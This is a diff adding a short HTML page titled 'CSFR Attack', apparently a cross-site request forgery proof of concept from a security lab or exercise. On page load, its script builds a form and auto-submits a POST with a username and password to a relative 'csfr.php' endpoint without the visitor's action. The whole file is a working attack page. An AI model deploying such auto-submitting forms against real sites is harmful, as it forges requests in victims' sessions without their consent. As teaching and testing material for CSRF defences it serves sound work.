@@ -1,0 +1,27 @@
+
+<!DOCTYPE html>
+<html>
+<head><title>CSFR Attack</title></head>
+<body>
+    <script>
+        window.onload = function() {
+            var form = document.createElement("form");
+            form.method = "POST";
+            form.action = "csfr.php";
+
+            var user = document.createElement("input");
+            user.name = "username";
+            user.value = "host";
+            form.appendChild(user);
+
+            var pass = document.createElement("input");
+            pass.name = "password";
+            pass.value = "pass";
+            form.appendChild(pass);
+
+            document.body.appendChild(form);
+            form.submit();
+        };
+    </script>
+</body>
+</html>
